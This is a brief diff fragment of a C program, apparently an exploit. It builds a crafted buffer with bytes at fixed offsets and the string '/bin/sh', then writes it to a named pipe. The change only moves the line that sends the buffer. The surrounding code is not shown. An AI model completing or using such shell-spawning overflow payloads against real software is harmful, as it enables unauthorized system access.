@@ -309,7 +309,7 @@ int main(void)
   strcpy(bufr + 627, "\x01\x01\x01\x01");
   // location of "/bin/sh"
   strcpy(bufr + 631, "/bin/sh\x00");
-  writecmd(PIPEPATH, bufr);
   
+  writecmd(PIPEPATH, bufr);
   return 0;
 }
